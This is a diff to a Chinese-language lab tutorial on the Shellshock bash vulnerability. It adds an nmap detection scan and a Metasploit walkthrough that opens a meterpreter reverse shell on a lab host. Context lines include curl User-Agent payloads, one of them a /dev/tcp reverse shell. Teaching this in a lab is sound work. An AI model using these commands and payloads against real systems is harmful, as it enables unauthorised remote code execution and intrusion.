@@ -97,6 +97,44 @@ curl -H "User-Agent: () { foo;}; echo \"Content-Type: text/plain\" ; echo ; /usr
 
 ![](attach/img/poc-2.png)
 
+### 使用nmap
+
+```bash
+# ref: https://nmap.org/nsedoc/scripts/http-shellshock.html
+# 经过实际测试，如果不指定使用 header=User-Agent 参数，当前目标靶机环境会返回 400 错误，导致检测出现误报（不存在shellshock漏洞）
+nmap -sV -p 80 --script http-shellshock --script-args header=User-Agent,uri=/victim.cgi 192.168.123.121
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2018-01-23 21:27 CST
+Nmap scan report for bogon (192.168.123.121)
+Host is up (0.00035s latency).
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.25 ((Unix))
+|_http-server-header: Apache/2.4.25 (Unix)
+| http-shellshock:
+|   VULNERABLE:
+|   HTTP Shellshock vulnerability
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2014-6271
+|       This web application might be affected by the vulnerability known as Shellshock. It seems the server
+|       is executing commands injected via malicious HTTP headers.
+|
+|     Disclosure date: 2014-09-24
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
+|       http://seclists.org/oss-sec/2014/q3/685
+|       http://www.openwall.com/lists/oss-security/2014/09/24/10
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.68 seconds
+```
+
+经验分享：
+
+* 在虚拟机环境中使用 ``tcpdump`` 抓包保存为 ``.pcap`` 格式文件，使用 ``scapy`` 读取抓包文件，可以在命令行方式中更优雅的查看任意报文
+* Kali内置了 ``scapy`` ，scapy的使用入门可以查看 [我的在线电子教材 - 基于Scapy的无线网络监听编程实践](http://sec.cuc.edu.cn/huangwei/textbook/mis/chap0x02/scapy.html)
+* nmap的 ``.nse`` 脚本调试可以使用诸如 ``stdnse.debug1("req.body: '%s'", req.body)`` 这样的语句打印关键变量，nmap执行扫描时可以使用 ``-d`` 参数开启 ``.nse`` 脚本中的 ``stdnse.debug1()`` 打印输出显示
+
 ### CVE-2014-6271
 
 ```bash
@@ -193,9 +231,101 @@ curl -H "User-Agent: () { ignored;};/usr/local/bash-4.3.0/bin/bash -i >& /dev/tc
 
 ![](attach/img/exploit-2.png)
 
+### 使用metasploit
+
+```bash
+# on Kali
+systemctl start postgresql
+msfdb init
+msfconsole
+# 以下命令在 msfconsole 中输入
+
+# 重建缓存是在后台执行的，需要很长时间 
+db_rebuild_cache
+
+# 搜索 bash 相关exploit
+# 在缓存没有重建完毕之前，会有一个警告信息提示如下，可以安全的忽略掉： 
+# [!] Module database cache not built yet, using slow search
+search base 
+
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+
+# 查看所有可用配置参数
+show options
+
+set rhost 192.168.123.121
+set TARGETURI /victim.cgi
+
+# 先验证漏洞的可利用性
+# 如果可利用，会显示： [+] 192.168.123.121:80 The target is vulnerable.
+check
+
+# 查看所有可用的攻击向量
+show payloads
+
+set linux/x86/meterpreter/reverse_tcp
+
+# 查看攻击向量的所有可用配置参数
+show options
+
+set LHOST 192.168.123.104
+
+exploit
+
+[*] Started reverse TCP handler on 192.168.123.104:4444
+[*] Command Stager progress - 100.46% done (1097/1092 bytes)
+[*] Sending stage (847604 bytes) to 192.168.123.121
+[*] Meterpreter session 1 opened (192.168.123.104:4444 -> 192.168.123.121:48030) at 2018-01-23 21:57:21 +0800
+
+meterpreter > getuid
+Server username: uid=1, gid=1, euid=1, egid=1
+meterpreter > pwd
+/usr/local/apache2/htdocs
+meterpreter > sysinfo
+Computer     : 172.18.0.2
+OS           : Debian 8.7 (Linux 4.10.0-28-generic)
+Architecture : x64
+Meterpreter  : x86/linux
+
+meterpreter > ifconfig
+
+Interface  1
+============
+Name         : lo
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 65536
+Flags        : UP,LOOPBACK
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+
+
+Interface 14
+============
+Name         : eth0
+Hardware MAC : 02:42:ac:12:00:02
+MTU          : 1500
+Flags        : UP,BROADCAST,MULTICAST
+IPv4 Address : 172.18.0.2
+IPv4 Netmask : 255.255.0.0
+
+# 启动一个系统shell
+shell
+
+# 由于容器环境中默认没有提供 sudo ，所以使用 sudo 提权会失败
+```
+
+# 漏洞利用的其他形式
+
+[PHP < 5.6.2 - 'Shellshock' 'disable_functions()' Bypass Command Injection](https://www.exploit-db.com/exploits/35146/)
+
+上面这个例子很好的说明了：一个漏洞的出现，往往会带来很多意想不到的创新利用方式。一个原本安全的防御机制（如这里的PHP的 ``函数黑名单机制`` 原本可以对命令注入攻击实现漏洞利用缓解效果）可能会因为一个第三方软件的漏洞而被绕过。这就是漏洞利用的艺术，这就是实际网络攻击往往不是单一漏洞利用过程的真实例子证明。
+
+
 # 参考资料
 
 * [Shellshock \(software bug\)](https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29)
 * [Shellshocker - Repository of "Shellshock" Proof of Concept Code](https://github.com/mubix/shellshocker-pocs)
 * [GNU » Bash : Security Vulnerabilities Published In 2014](https://www.cvedetails.com/vulnerability-list/vendor_id-72/product_id-21050/year-2014/GNU-Bash.html)
+* [Bash 漏洞是什么级别的漏洞，有什么危害，具体如何修复？](https://www.zhihu.com/question/25522948)
+* [BurpSuite主动和被动扫描插件 ActiveScan++，可以检测 CVE-2014-6271/CVE-2014-6278 存在性](https://github.com/albinowax/ActiveScanPlusPlus)
 
